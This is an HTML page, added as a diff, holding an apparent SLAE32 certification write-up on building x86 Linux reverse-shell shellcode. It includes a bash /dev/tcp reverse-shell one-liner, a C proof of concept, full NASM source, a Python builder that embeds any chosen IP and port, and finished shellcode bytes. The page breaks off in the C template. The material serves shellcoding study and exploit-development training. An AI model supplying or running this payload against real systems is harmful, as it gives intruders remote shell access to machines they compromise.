@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself."><meta property="og:title" content="Assignment N°2 - Reverse Shell (NASM)" />
+<meta property="og:description" content="Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each assignment by yourself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.phrozen.io/docs/infosec/linux/slae32/ex2-reverseshell/" />
+<meta property="article:published_time" content="2020-03-14T11:57:00+01:00" />
+<meta property="article:modified_time" content="2020-03-14T11:57:00+01:00" />
+<title>Assignment N°2 - Reverse Shell (NASM) | Phrozen</title>
+<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.63abd10f627a7a06406140610b7ce76d028552de10d790fcb09f332349c39047.css" integrity="sha256-Y6vRD2J6egZAYUBhC3znbQKFUt4Q15D8sJ8zI0nDkEc=">
+<script defer src="/en.search.min.86e3cb1d1d29ddd8a3d2600962708437dcff21fc53cbdb40ba7f1f89e3ae2043.js" integrity="sha256-huPLHR0p3dij0mAJYnCEN9z/IfxTy9tAun8fieOuIEM="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-159560668-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script src="https://kit.fontawesome.com/8da36c42cc.js" crossorigin="anonymous"></script>
+  
+</head>
+
+<body>
+  <input type="checkbox" class="hidden" id="menu-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/logo.svg" alt="Logo" /></a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/projects/" class="">Projects</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/projects/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/infosec/" class="">InfoSec</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/" class="collapsed ">Linux</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/" class="collapsed ">SLAE32</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex7-crypters/" class="">Assignment N°7 - Crypters (Delphi/ASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex6-polymorphism/" class="">Assignment N°6 - Polymorphism</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex5-shellcode-analyzing/" class="">Assignment N°5 - Shellcode Analyzing / Dissecting</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex4-encoder/" class="">Assignment N°4 - Encoder (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex3-egghunter/" class="">Assignment N°3 - Egg Hunter (C)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex2-reverseshell/" class="active">Assignment N°2 - Reverse Shell (NASM)</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/linux/slae32/ex1-bindshell/" class="">Assignment N°1 - Bindshell (NASM)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/infosec/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="/docs/programming/" class="">Programming</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/programming/windows/" class="collapsed ">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/programming/general/" class="collapsed ">General</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Social Networks
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/jlesueur/" target="_blank" rel="noopener"><i class='fa fa-linkedin'></i>
+        Linkedin
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://www.twitter.com/darkcodersc" target="_blank" rel="noopener"><i class='fa fa-twitter'></i>
+        Twitter
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/DarkCoderSc" target="_blank" rel="noopener"><i class='fa fa-github'></i>
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Other Stuff
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="/disclaimer/disclaimer" target="_blank" rel="noopener">
+        Legal
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Assignment N°2 - Reverse Shell (NASM)</strong>
+
+  <label for="toc-control">
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="assignment-goals">Assignment Goals</h1>
+<p><img src="/images/202005/slae32-banner.png" alt="SLAE32" /></p>
+<blockquote class="book-hint warning">
+  <p>This paper is part of the certification process following the <a href="https://www.pentesteracademy.com/course?id=3">SLAE32 course</a> (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.</p>
+<p>If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.</p>
+<p>Why? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.</p>
+<p>Student ID: <strong>SLAE-1530</strong></p>
+
+</blockquote>
+
+<ol>
+<li>
+<p>Create a TCP Reverse Shellcode for Linux x86-32.</p>
+</li>
+<li>
+<p>The port number should be easily configurable.</p>
+</li>
+<li>
+<p>The IP address should be easily configurable.</p>
+</li>
+<li>
+<p>Bonus if getting referenced in <a href="https://www.exploit-db.com">exploit-db</a> or <a href="http://shell-storm.org/">shell-storm</a>.</p>
+</li>
+</ol>
+<h1 id="tcp-reverse-shell-principle">TCP Reverse Shell Principle</h1>
+<p>In first exercise we learnt how to create our own TCP Bindshell shellcode using few syscalls (<code>socketcall()</code>, <code>dup2()</code> and <code>execve()</code>).</p>
+<p>A reverse shell is almost identical to a classic bindshell, this time instead of having a shellcode that listen for new clients, we will create a shellcode that will connect back to a remote server.</p>
+<p>Fortunately, on Linux by default, we do not have any restrictions to manage sockets in client mode.</p>
+<blockquote class="book-hint info">
+  I invite you to read the first <a href="/docs/linux/slae32/ex1-bindshell/">paper</a> before this one. Many things are similar between the two shellcodes and we will only point main differences.
+</blockquote>
+
+<p>On Linux (in bellow example Ubuntu 18.04), it is easy to create a simple reverse shell connection only using a single command.</p>
+<p>First open the listener (in this case, the attacker&rsquo;s machine):</p>
+<p>root@local:# <code>nc -lvp 443</code></p>
+<p>And then, bellow command will establish a new connection to attacker&rsquo;s machine and redirect <code>stdin</code>(0), <code>stdout</code>(1) and <code>stderr</code>(2) file descriptors.</p>
+<p>user@local:$ <code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/443 0&gt;&amp;1</code></p>
+<p><img src="/images/202005/Screenshot-2020-05-09-at-18.20.26.png" alt="Reverse Shell Example" /></p>
+<blockquote class="book-hint info">
+  We could also use Netcat 🐱 with <code>mknod</code> command like in previous paper example.
+</blockquote>
+
+<h1 id="process">Process</h1>
+<p>In real life, we will most of the time face reverse shell shellcodes using one of the two first methods brievly introduced bellow.</p>
+<p>Since the two first methods are very similar to our first paper, we decided to think out of the box and use a completely different approach.</p>
+<p>Indeed, we will spawn a new reverse shell only running a specially crafted command with <code>execve()</code> syscall.</p>
+<p>Method 1 and Method 2 chapter will only briefly introduce required steps for creating a reverse shell using different syscalls.</p>
+<p>Method 3 is the subject of our paper and will describe the whole process in detail.</p>
+<h2 id="method-1---classic">Method 1 - Classic</h2>
+<h3 id="required-syscalls">Required Syscalls</h3>
+<p>Below table is ordered by syscall execution order.</p>
+<table>
+<thead>
+<tr>
+<th>Decimal N°</th>
+<th>Hex N°</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>359</td>
+<td>0x167</td>
+<td>socket()</td>
+</tr>
+<tr>
+<td>362</td>
+<td>0x16a</td>
+<td>connect()</td>
+</tr>
+<tr>
+<td>63</td>
+<td>0x3f</td>
+<td>dup2()</td>
+</tr>
+<tr>
+<td>11</td>
+<td>0xb</td>
+<td>execve()</td>
+</tr>
+</tbody>
+</table>
+<p>This technique is what we would use if we were coding a classic client program using higher language (C/C++, Pascal etc..).</p>
+<h3 id="steps">Steps</h3>
+<ul>
+<li>Create a new IPv4/TCP socket using <code>socket()</code>.</li>
+<li>Establish a new connection to a listening socket defined by its IP address and Port number using <code>connect()</code>.</li>
+<li>Duplicate <code>stdin</code>(0), <code>stdout</code>(1) and <code>stderr</code>(2) file descriptors with client socket using <code>dup2()</code>.</li>
+<li>Finally, spawn a new shell using <code>execve()</code> with <code>/bin/sh</code> or any shell you want.</li>
+</ul>
+<h2 id="method-2---socketcall">Method 2 - <code>socketcall()</code></h2>
+<p>Below table is ordered by syscall execution order.</p>
+<table>
+<thead>
+<tr>
+<th>Decimal N°</th>
+<th>Hex N°</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>102</td>
+<td>0x66</td>
+<td>socketcall()</td>
+</tr>
+<tr>
+<td>63</td>
+<td>0x3f</td>
+<td>dup2()</td>
+</tr>
+<tr>
+<td>11</td>
+<td>0xb</td>
+<td>execve()</td>
+</tr>
+</tbody>
+</table>
+<p>On x86-32 architecture, this technique will remove both <code>socket()</code> and <code>connect()</code> syscalls.</p>
+<p>Steps are the same as for method 1, however <code>socketcall()</code> function differently, see previous <a href="/docs/linux/slae32/ex1-bindshell/">paper</a> for more detail.</p>
+<h3 id="steps-1">Steps</h3>
+<ul>
+<li>Create a new IPv4/TCP socket using <code>socketcall()</code> and call number <code>SYS_SOCKET</code>(1)</li>
+<li>Establish a new connection to a listening socket defined by its IP address and Port number using <code>socketcall()</code> and call number <code>SYS_CONNECT</code>(2).</li>
+<li>Duplicate <code>stdin</code>(0), <code>stdout</code>(1) and <code>stderr</code>(2) file descriptors with client socket using <code>dup2()</code>.</li>
+<li>Finally, spawn a new shell using <code>execve()</code> with <code>/bin/sh</code> or any shell you want.</li>
+</ul>
+<h2 id="method-3---run-command">Method 3 - Run Command</h2>
+<p>Why would we bother manipulating sockets if everything we need is already natively available through command line? We don&rsquo;t have to!</p>
+<h3 id="advanced-execveusage-schema">Advanced <code>execve()</code>usage schema</h3>
+<p>It requires four registers: <code>eax</code>, <code>ebx</code>, <code>ecx</code> and <code>edx</code></p>
+<ul>
+<li><code>eax</code> register value needs to be set to <code>0xb</code> representing the syscall number for <code>execve()</code>.</li>
+<li><code>ebx</code> register must be set with an address pointing to the program name (<code>/bin/bash</code>).</li>
+<li><code>ecx</code> register must contains and address pointing to a NULL terminated array of addresses pointing to arguments to pass to the program.</li>
+<li><code>edx</code> register can contain additional environment settings, we won&rsquo;t use that register so it will point to an address containing NULL.</li>
+</ul>
+<h3 id="assembly-code-creation-plan">Assembly Code Creation Plan</h3>
+<h4 id="part-i---testing-and-understanding-this-technique-using-high-level-language-c">Part I - Testing and understanding this technique using high level language (C)</h4>
+<p>It is a good habit to create things in a higher level language before coding in assembly.</p>
+<p>So let&rsquo;s quickly script something in C.</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(void) {
+    char* args[] = { 
+        &quot;/bin/bash&quot;, &quot;-c&quot;, // run a new command (could be /bin/sh to save few bytes)
+        &quot;//*/bash -i &gt;&amp; /dev/tcp/127.0.0.1/443 0&gt;&amp;1&quot;, // reverse shell command
+        NULL // NULL byte telling we reached the last argument
+    };
+
+    execve(args[0], &amp;args[0], NULL);
+
+    return 0;
+}
+</code></pre><p>user@local:$ <code>gcc poc.c -o poc</code></p>
+<p>Now we open a new listener:</p>
+<p>root@local:# <code>nc -lvp 443</code></p>
+<p>and run in another terminal the PoC:</p>
+<p>user@local:$ <code>./poc</code></p>
+<p>Success, we have a shell!</p>
+<pre><code>root@ubuntu:/home/phrozen/SLAE32/SLAE-Exam/Level2# nc -lvp 443
+Listening on [0.0.0.0] (family 0, port 443)
+Connection from localhost 56256 received!
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+phrozen@ubuntu:/home/phrozen/SLAE32/SLAE-Exam/Level2$
+</code></pre><h4 id="part-ii---apply-above-principle-to-nasm">Part II - Apply above principle to NASM</h4>
+<h5 id="1---push-pathname">1 - Push <code>*pathname</code></h5>
+<p>Remember, <code>ebx</code> register must contain an address pointing to a NULL terminated string. This string represent the program we want to run : <code>/bin/bash</code></p>
+<blockquote class="book-hint info">
+  We could also use another shell (ex: <code>/bin/sh</code>), this would save 4 bytes to our final shellcode.
+</blockquote>
+
+<p>Since we are facing a Little Endian architecture, the pushed string must be stored in reverse order.</p>
+<p>To prevent extra instructions we also need to take care of alignment. x86-32 address are 4 bytes long so string length must be a multiple of 4.</p>
+<p>Since <code>/bin/bash</code> is 9 bytes long, we must add 3 extra <code>/</code> =&gt; : <code>////bin/bash</code> to fit alignment.</p>
+<h6 id="example-stack-dump">Example Stack Dump</h6>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>000000058</td>
+<td>0x2f2f2f2f (////)</td>
+</tr>
+<tr>
+<td>00000005c</td>
+<td>0x2f6e6962 (/nib)</td>
+</tr>
+<tr>
+<td>000000060</td>
+<td>0x68736162 (hsab)</td>
+</tr>
+<tr>
+<td>000000064</td>
+<td>0x00000000 (NULL)</td>
+</tr>
+</tbody>
+</table>
+<p>Following above stack dump <code>ebx</code> register would be set to <code>0x00000058</code></p>
+<hr>
+<h5 id="2---push-argv">2 - Push <code>*argv[]</code></h5>
+<p>This part is the most tricky part so far, <code>ecx</code> register needs to point to a NULL terminated array of addresses. Each address need to point to a NULL terminated string address with the argument value.</p>
+<p>We still need to take care of alignment and Endianness.</p>
+<p>We will push three different arguments.</p>
+<h6 id="argv0">Argv[0]</h6>
+<p>The first argument by convention contains the pathname (<code>/bin/bash</code>).
+The second argument contains <code>-c</code> which tells <code>bash</code> program we want to run a command line.
+Finally third argument contains our reverse shell payload string: <code>/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/443 0&gt;&amp;1</code></p>
+<p>Notice to save some precious bytes, we can compress the payload string as follows: <code>/*/bash -i&gt;&amp;/dev/tcp/2130706433/443 0&gt;&amp;1</code></p>
+<ul>
+<li><code>/*/bash</code> is a wildcard that will search for any subdirectories containing <code>bash</code> program.</li>
+<li><code>2130706433</code> is the equivalent of <code>127.0.0.1</code> but in &ldquo;integer&rdquo; format.</li>
+</ul>
+<h6 id="example-stack-dump-1">Example Stack Dump</h6>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>000000014</td>
+<td>addr(0x000000004) (Argv[0] = <code>ebx</code>)</td>
+</tr>
+<tr>
+<td>000000018</td>
+<td>addr(0x000000040) (Argv[1])</td>
+</tr>
+<tr>
+<td>00000001c</td>
+<td>addr(0x000000014) (Argv[2])</td>
+</tr>
+<tr>
+<td>000000020</td>
+<td>0x000000000 (NULL)</td>
+</tr>
+<tr>
+<td>000000024</td>
+<td>0x622f2a2f (1&amp;&gt;0)</td>
+</tr>
+<tr>
+<td>000000028</td>
+<td>0x20687361 (344)</td>
+</tr>
+<tr>
+<td>00000002c</td>
+<td>0x263e692d (/334)</td>
+</tr>
+<tr>
+<td>000000030</td>
+<td>0x7665642f (6070)</td>
+</tr>
+<tr>
+<td>000000034</td>
+<td>0x7063742f (312/)</td>
+</tr>
+<tr>
+<td>000000038</td>
+<td>0x3331322f (pct/)</td>
+</tr>
+<tr>
+<td>00000003c</td>
+<td>0x36303730 (ved/)</td>
+</tr>
+<tr>
+<td>000000040</td>
+<td>0x2f333334 (&amp;&gt;i-)</td>
+</tr>
+<tr>
+<td>000000044</td>
+<td>0x20333434 ( hsa)</td>
+</tr>
+<tr>
+<td>000000048</td>
+<td>0x31263e30 (b/*/)</td>
+</tr>
+<tr>
+<td>00000004c</td>
+<td>0x00000000 (NULL)</td>
+</tr>
+<tr>
+<td>000000050</td>
+<td>0x632d     (c-)</td>
+</tr>
+<tr>
+<td>000000054</td>
+<td>0x00000000 (NULL)</td>
+</tr>
+</tbody>
+</table>
+<p>Following above stack dump <code>ecx</code> register would be set to <code>0x000000014</code></p>
+<hr>
+<h5 id="3---push-envp">3 - Push <code>*envp[]</code></h5>
+<p>Lastly we need to set the <code>edx</code> register to an address that points to NULL.</p>
+<p>The easiest way is to simply push a new NULL to the top of the stack then assign top address of the stack (<code>esp</code>) to <code>edx</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th>Content</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>000000010</td>
+<td>0x00000000 (NULL)</td>
+</tr>
+</tbody>
+</table>
+<p>Following above stack dump <code>edx</code> register would be set to <code>0x00000010</code></p>
+<h5 id="4---call-execve">4 - Call <code>execve()</code></h5>
+<p>We can finally set <code>eax</code> to <code>0xb</code> to call the <code>execve()</code> syscall.</p>
+<pre><code>*Debugging* on success execve() does not return.
+</code></pre>
+<hr>
+<h3 id="tcp-reverse-shell-code-nasm">TCP Reverse Shell Code (NASM)</h3>
+<pre><code>;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Filename : bindshell.nasm                         ;
+; Author   : Jean-Pierre LESUEUR                    ;
+; Website  : https://www.phrozen.io/                ;
+; Email    : jplesueur@phrozen.io                   ;
+; Twitter  : @DarkCoderSc                           ;
+;                                                   ;
+; --------------------------------------------------;
+; SLAE32 Certification Exercise N°2                 ;
+; (Pentester Academy).                              ; 
+; https://www.pentesteracademy.com                  ;
+; --------------------------------------------------;
+;                                                   ;
+; Purpose:                                          ;
+; --------------------------------------------------;
+; Reverse Shell                                     ;
+; Connects to 127.0.0.1:443 by default              ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+global _start
+
+section .text
+_start:
+	xor eax, eax	
+
+	;--------------------------------------------------------------------
+	; *pathname
+	;--------------------------------------------------------------------
+
+	; ///bin//bash
+	push eax
+	push 0x68736162 ; hsab
+	push 0x2f2f6e69 ; //ni
+	push 0x622f2f2f ; b///
+	mov ebx, esp
+	
+	;--------------------------------------------------------------------
+	; *argv[]
+	;--------------------------------------------------------------------	
+
+	; -c
+	mov ax, 0x632d
+	push eax
+	xor eax, eax
+	mov edx, esp
+
+	; /*/bash -i&gt;&amp;/dev/tcp/2130706433/443 0&gt;&amp;1
+	push eax
+	push 0x31263e30 ; 1&amp;&gt;0
+	push 0x20333434 ;  344
+	push 0x2f333334 ; /334
+	push 0x36303730 ; 6070
+	push 0x3331322f ; 312/
+	push 0x7063742f ; pct/
+	push 0x7665642f ; ved/
+	push 0x263e692d ; &amp;&gt;i-
+	push 0x20687361 ;  hsa
+	push 0x622f2a2f ; b/*/	
+	
+	mov esi, esp
+
+	push eax        ; EOF Arguments 	
+
+	push esi        ; Argv[2] = &quot;/bin//bash -i &gt;&amp; /dev/tcp/127.0.0.1/443 0&gt;&amp;1&quot;
+
+	push edx        ; Argv[1] = &quot;-c&quot;
+
+	push ebx        ; Argv[0] = &quot;/bin/bash&quot;
+
+	mov ecx, esp
+
+	;--------------------------------------------------------------------
+	; *envp[] - We don't care (NULL)
+	;--------------------------------------------------------------------	
+	push eax
+	mov edx, esp
+
+	;--------------------------------------------------------------------
+	; execve() syscall
+	;--------------------------------------------------------------------	
+	mov al, 0xb     
+
+	int 0x80
+</code></pre><h4 id="compile-and-test-our-payload">Compile and Test our Payload</h4>
+<p>user@local:$ <code>nasm -f elf32 -o revshell.o revshell.nasm</code></p>
+<p>user@local:$ <code>ld -o revshell revshell.o</code></p>
+<p>Now we open a new listener:</p>
+<p>root@local:# <code>nc -lvp 443</code></p>
+<p>and run in another terminal the PoC:</p>
+<p>user@local:$ <code>./revshell</code></p>
+<p>Success, we have a shell!</p>
+<p><img src="/images/202005/Screenshot-2020-05-10-at-12.51.03.png" alt="NASM Reverse Shell" /></p>
+<h1 id="shellcode-builder-python3">Shellcode Builder (Python3)</h1>
+<p>The last required objective for this exercise is to create a builder to easily patch the final shellcode with desired IP address and TCP port number.</p>
+<p>This objective requires more work than for TCP bindshell but is by far more straightforward.</p>
+<p>We only need to patch one string in our final payload (highlighted in bellow screen).</p>
+<p><img src="/images/202005/Screenshot-2020-05-10-at-13.00.05.png" alt="Objdump" /></p>
+<p>To do so we must especially take care of two things:</p>
+<div class="book-columns flex flex-wrap">
+  
+  <div class="flex-even markdown-inner">
+    <h2 id="n1">N°1</h2>
+<p>Each chunks (stack pushes) of our final string payload must be aligned to 4 bytes and reversed.
+  </div>
+  
+  <div class="flex-even markdown-inner">
+    <h2 id="n2">N°2</h2>
+<p>We will translate IP Address in its integer equivalent (network byte order) using <code>inet_aton</code> from socket library. This will minimize final shellcode length.
+  </div>
+  
+</div>
+
+<h2 id="builder-code-python3">Builder Code (Python3)</h2>
+<pre><code>#!/usr/bin/python3
+
+'''
+	Jean-Pierre LESUEUR
+	@DarkCoderSc
+
+	jplesueur@phrozen.io
+	https://www.phrozen.io
+
+	***
+	SLAE32 Certification Exercise N°2
+ 	(Pentester Academy).
+ 	https://www.pentesteracademy.com
+	***
+
+	Description:
+
+ 	Generate a TCP Reverse Shell with desired IP Address and TCP Port number.
+'''
+
+import socket
+import sys
+import struct
+from textwrap import wrap
+
+def fail(message):
+    print(&quot;[\033[31mKO\033[39m] &quot; + message)
+
+def success(message):
+    print(&quot;[\033[32mOK\033[39m] &quot; + message)
+	
+try:
+	if len(sys.argv) != 3:
+		print(&quot;Usage: ./gen_revshell.py &lt;LHOST&gt; &lt;LPORT&gt;&quot;)
+
+		raise
+	else:
+		LHOST = sys.argv[1]
+		try:			
+			socket.inet_aton(LHOST)
+		except:
+			fail(&quot;Invalid IP address (ex:127.0.0.1)&quot;)
+			raise
+
+		try:
+			LPORT = int(sys.argv[2])
+
+			if (LPORT &gt; 65535) or (LPORT &lt; 0):
+				raise
+		except:
+			fail(&quot;Invalid port number (0..65535)&quot;)
+			raise
+except:
+	sys.exit()			
+
+revstr = &quot;/*/bash -i&gt;&amp;/dev/tcp/{}/{} 0&gt;&amp;1&quot;
+
+payload = &quot;&quot;
+
+payload += &quot;\\x31\\xc0&quot;                 # xor eax, eax
+payload += &quot;\\x50&quot;                      # push eax
+payload += &quot;\\x68\\x62\\x61\\x73\\x68&quot;  # push   0x68736162
+payload += &quot;\\x68\\x69\\x6e\\x2f\\x2f&quot;  # push   0x2f2f6e69
+payload += &quot;\\x68\\x2f\\x2f\\x2f\\x62&quot;  # push   0x622f2f2f
+payload += &quot;\\x89\\xe3&quot;                 # mov    ebx,esp
+payload += &quot;\\x66\\xb8\\x2d\\x63&quot;       # mov    ax,0x632d
+payload += &quot;\\x50&quot;                      # push   eax
+payload += &quot;\\x31\\xc0&quot;                 # xor    eax,eax
+payload += &quot;\\x89\\xe2&quot;                 # mov    edx,esp
+payload += &quot;\\x50&quot;                      # push   eax
+#########################################
+
+'''
+	Align command following chosen options
+'''
+LHOST = struct.unpack(&quot;!I&quot;, socket.inet_aton(LHOST))[0]
+
+revstr = revstr.format(LHOST, LPORT)
+
+pad = 4 - (len(revstr) % 4)
+
+if (pad &lt; 4):
+	revstr = (&quot;/&quot;*pad) + revstr
+
+'''
+	Write our reverse shell command (Aligned)
+'''
+
+for i in reversed(range(0, len(revstr), 4)):
+	opcode = &quot;\\x68&quot;
+	for n in range(4):
+		opcode += &quot;\\x&quot; + revstr[i:(i+4)][n:(n+1)].encode('ascii').hex()
+		
+
+	payload += opcode
+
+#########################################
+payload += &quot;\\x89\\xe6&quot;                 # mov    esi,esp
+payload += &quot;\\x50&quot;                      # push   eax
+payload += &quot;\\x56&quot;                      # push   esi
+payload += &quot;\\x52&quot;                      # push   edx
+payload += &quot;\\x53&quot;                      # push   ebx
+payload += &quot;\\x89\\xe1&quot;                 # mov    ecx,esp
+payload += &quot;\\x50&quot;                      # push   eax
+payload += &quot;\\x89\\xe2&quot;                 # mov    edx,esp
+payload += &quot;\\xb0\\x0b&quot;                 # mov    al,0xb
+payload += &quot;\\xcd\\x80&quot;                 # int    0x80
+
+size = int(len(payload) / 4)
+success(&quot;Shellcode successfully generated size={} Bytes.&quot;.format(size))
+
+final_payload = &quot;// Shellcode size = {}\n&quot;.format(size)
+final_payload += &quot;unsigned char code[] = \\\n&quot;
+
+for l in wrap(payload, 64):
+	final_payload += &quot;\t\&quot;{}\&quot;\n&quot;.format(l)
+
+final_payload = final_payload[:-1] + &quot;;&quot;
+
+print(final_payload)
+</code></pre><h3 id="usage">Usage</h3>
+<p>user@local:$ <code>python3 ./gen_revshell.py 172.16.20.145 1403</code></p>
+<p>or</p>
+<p>user@local:$ <code>chmod +x gen_revshell.py &amp;&amp; ./gen_revshell.py 172.16.20.145 1403</code></p>
+<blockquote class="book-hint warning">
+  Replace IP address with yours, <code>172.16.20.145</code> was my Ubuntu VM actual local IP address.
+</blockquote>
+
+<blockquote class="book-hint danger">
+  Never execute shellcodes from unknown sources without understanding what they really do. (Ndisasm and GDB are your best friend)
+</blockquote>
+
+<pre><code>// Shellcode size = 100
+unsigned char code[] = \
+        &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+        &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x30&quot;
+        &quot;\x3e\x26\x31\x68\x34\x30\x33\x20\x68\x39\x33\x2f\x31\x68\x37\x33&quot;
+        &quot;\x34\x39\x68\x32\x38\x38\x36\x68\x74\x63\x70\x2f\x68\x64\x65\x76&quot;
+        &quot;\x2f\x68\x69\x3e\x26\x2f\x68\x73\x68\x20\x2d\x68\x2a\x2f\x62\x61&quot;
+        &quot;\x68\x2f\x2f\x2f\x2f\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89\xe2&quot;
+        &quot;\xb0\x0b\xcd\x80&quot;;
+</code></pre><p>We can place above raw shellcode in our C template.</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+// Shellcode size = 100
+unsigned char code[] = \
+        &quot;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x69\x6e\x2f\x2f\x68\x2f\x2f&quot;
+        &quot;\x2f\x62\x89\xe3\x66\xb8\x2d\x63\x50\x31\xc0\x89\xe2\x50\x68\x30&quot;
+        &quot;\x3e\x26\x31\x68\x34\x30\x33\x20\x68\x39\x33\x2f\x31\x68\x37\x33&quot;
+        &quot;\x34\x39\x68\x32\x38\x38\x36\x68\x74\x63\x70\x2f\x68\x64\x65\x76&quot;
+        &quot;\x2f\x68\x69\x3e\x26\x2f\x68\x73\x68\x20\x2d\x68\x2a\x2f\x62\x61&quot;
+        &quot;\x68\x2f\x2f\x2f\x2f\x89\xe6\x50\x56\x52\x53\x89\xe1\x50\x89\xe2&quot;
